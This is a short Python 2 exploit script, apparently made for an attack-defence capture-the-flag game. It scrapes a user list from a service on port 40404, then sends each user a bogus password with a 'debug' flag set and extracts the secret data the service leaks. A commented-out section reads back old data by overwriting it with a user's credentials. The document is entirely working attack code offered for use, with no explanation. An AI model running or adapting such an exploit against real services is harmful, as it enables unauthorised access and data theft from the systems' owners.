#!/usr/bin/python -u

import random
import httplib
import urllib2
import urllib
import sys

def exploit(ip,cookie):
	url = "http://%s:%d" % (ip,40404)
	try:
		page = urllib2.urlopen(url,timeout=2).read()
	except:
		print "ERROR: Could not connect"
		return

	users_start = page.find("<h3>Users:</h3>")
	users_end = page.find("</body>")
	users = []
	if(users_start != -1 and users_end != -1):
		users_txt = page[users_start+15:users_end]
		for user in users_txt.split(" <br>"):
			if(user != ''):
				users.append(user)

	for user in users:
		params = urllib.urlencode({
			'user':user,
			'pass':'unknown',
			'data':'h4x',
			'debug':'true'})
		try:
			conn = urllib2.urlopen(url,params)
			result = conn.read()
			index = result.find("Debug:")
			if(index != -1):
				flag = result[index+6:].strip()
				print "FLAG:",flag
		except:
			pass
	"""
	user,passwd = random.choice(users)

	params = urllib.urlencode({
		'user': user, 
		'pass': passwd, 
		'data' : flag, 
		'debug' : 'false'})
	try:
		conn = urllib2.urlopen(url,params)
		result = conn.read()
		index = result.find("old data was")
		if(index != -1):
			old_flag = result[index+12:].strip()
			print "FLAG:",old_flag
	except:
		print "ERROR: Could not post new flag"
	"""
def main():
	ip = sys.argv[1]
	cookie = None

	if(len(sys.argv) == 3):
		cookie = sys.argv[2]

	exploit(ip,cookie)

if __name__ == '__main__':
	main()
